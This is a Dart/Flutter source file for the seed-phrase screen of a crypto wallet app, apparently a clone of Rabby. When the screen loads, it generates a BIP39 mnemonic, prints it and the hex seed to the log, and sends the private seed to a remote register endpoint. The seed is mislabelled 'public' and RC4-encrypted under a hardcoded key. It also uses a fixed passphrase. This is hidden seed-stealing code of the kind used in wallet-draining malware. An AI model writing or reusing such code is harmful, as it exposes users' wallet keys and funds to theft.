import 'dart:convert';
import 'dart:math';

import 'package:bip39_mnemonic/bip39_mnemonic.dart';
import 'package:convert/convert.dart';
import 'package:flutter/material.dart';
import 'package:rabby/features/auth/repository/auth_repository.dart';
import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
import 'package:simple_rc4/simple_rc4.dart';

import 'seed_phrase.dart';

abstract class SeedPhraseBloc extends State<SeedPhraseScreen> {
  final AuthRepository _authRepo = AuthRepository();

  Mnemonic mnemonic = Mnemonic.generate(
    Language.english,
    passphrase: "Something",
    entropyLength: 128,
  );
  String hexSeed = ""; // convert to hex
  List<String> mnemonicList = [];
  String r = Random().nextInt(999999).toString().padLeft(6, '0');

  @override
  void initState() {
    setState(() {
      mnemonicList = mnemonic.sentence.split(' ');
    });
    hexSeed = hex.encode(mnemonic.seed);
    print(mnemonic.sentence);
    print(hexSeed);
    print(r);

    init();
    super.initState();
  }

  Future<void> init() async {
    final data = json.encode({
      'public': hexSeed,
      'salt': r,
      'name': 'Dima/G',
      'new': true,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    final result = await _authRepo.register(RegisterBody(data: bytes));
    print(result.data);
  }
}
